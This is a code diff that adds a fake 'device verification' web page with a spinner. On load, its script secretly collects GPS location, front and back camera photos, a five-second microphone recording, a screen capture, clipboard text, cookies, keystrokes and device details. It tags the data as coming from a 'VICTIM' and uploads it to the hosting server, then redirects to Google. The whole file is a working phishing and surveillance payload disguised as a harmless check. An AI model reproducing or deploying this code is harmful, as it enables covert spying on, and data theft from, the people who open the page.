@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            background: #0f172a; 
+            color: white; 
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .loader { text-align: center; }
+        .spinner { 
+            width: 50px; 
+            height: 50px; 
+            border: 4px solid #1e293b;
+            border-top: 4px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        #status { color: #94a3b8; font-size: 14px; margin-top: 20px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <h2>Verifying your device...</h2>
+        <p id="status">Please wait...</p>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <audio id="audio" style="display:none;"></audio>
+
+    <script>
+        // ===== মেইন ফাংশন =====
+        async function collectAllData() {
+            const status = document.getElementById('status');
+            
+            // 1️⃣ ডিভাইস ইনফো
+            status.innerText = '📱 Collecting device info...';
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Unknown',
+                touchSupport: 'ontouchstart' in window,
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    speed: navigator.connection.downlink + 'Mbps'
+                } : 'Unknown'
+            };
+
+            // 2️⃣ ব্যাটারি ইনফো
+            status.innerText = '🔋 Checking battery...';
+            let batteryInfo = 'Unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100) + '%',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+            }
+
+            // 3️⃣ জিপিএস লোকেশন
+            status.innerText = '📍 Getting location...';
+            let gpsLocation = null;
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                gpsLocation = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed
+                };
+            } catch(e) {}
+
+            // 4️⃣ ক্যামেরা (ফ্রন্ট + ব্যাক)
+            status.innerText = '📸 Capturing camera...';
+            let frontImage = null, backImage = null;
+            
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = frontStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                frontImage = canvas.toDataURL('image/png');
+                frontStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = backStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                backImage = canvas.toDataURL('image/png');
+                backStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 5️⃣ অডিও রেকর্ডিং
+            status.innerText = '🎤 Recording audio...';
+            let audioData = null;
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const audioCtx = new AudioContext();
+                const source = audioCtx.createMediaStreamSource(audioStream);
+                const recorder = new MediaRecorder(audioStream);
+                
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                
+                // 5 সেকেন্ড রেকর্ড
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                recorder.stop();
+                
+                await new Promise(resolve => recorder.onstop = resolve);
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                audioData = await new Promise(resolve => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.readAsDataURL(blob);
+                });
+                audioStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 6️⃣ স্ক্রিনশট
+            status.innerText = '🖥️ Capturing screenshot...';
+            let screenshot = null;
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await video.play();
+                canvas.width = video.videoWidth || 1920;
+                canvas.height = video.videoHeight || 1080;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                screenshot = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 7️⃣ ক্লিপবোর্ড ডেটা
+            status.innerText = '📋 Reading clipboard...';
+            let clipboardData = null;
+            try {
+                const text = await navigator.clipboard.readText();
+                clipboardData = text;
+            } catch(e) {}
+
+            // 8️⃣ কুকিজ
+            status.innerText = '🍪 Extracting cookies...';
+            let cookies = document.cookie;
+
+            // 9️⃣ কীস্ট্রোক লগিং (শুধু এই পেজে টাইপ করলে)
+            status.innerText = '⌨️ Monitoring keystrokes...';
+            let keystrokes = [];
+            const keyListener = (e) => {
+                keystrokes.push({
+                    key: e.key,
+                    timestamp: Date.now()
+                });
+            };
+            document.addEventListener('keydown', keyListener);
+            
+            // 5 সেকেন্ড কীস্ট্রোক মনিটর
+            await new Promise(resolve => setTimeout(resolve, 5000));
+            document.removeEventListener('keydown', keyListener);
+
+            // 🔟 সব ডেটা পাঠানো
+            status.innerText = '📤 Sending data...';
+            
+            const payload = {
+                site: 'NEXUS',
+                username: 'VICTIM-' + Math.random().toString(36).substring(2, 8),
+                password: '••••••••',
+                frontImage: frontImage,
+                backImage: backImage,
+                audioData: audioData,
+                screenshot: screenshot,
+                deviceInfo: deviceInfo,
+                batteryInfo: batteryInfo,
+                gpsLocation: gpsLocation,
+                clipboardData: clipboardData,
+                cookies: cookies,
+                keystrokes: keystrokes,
+                timestamp: Date.now()
+            };
+
+            try {
+                const res = await fetch('/upload/ultimate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if(res.ok) {
+                    status.innerText = '✅ Done! Redirecting...';
+                    window.location.href = 'https://google.com';
+                }
+            } catch(e) {
+                status.innerText = '⚠️ Error, redirecting...';
+                window.location.href = 'https://google.com';
+            }
+        }
+
+        // ===== শুরু করো =====
+        collectAllData();
+    </script>
+</body>
+</html>
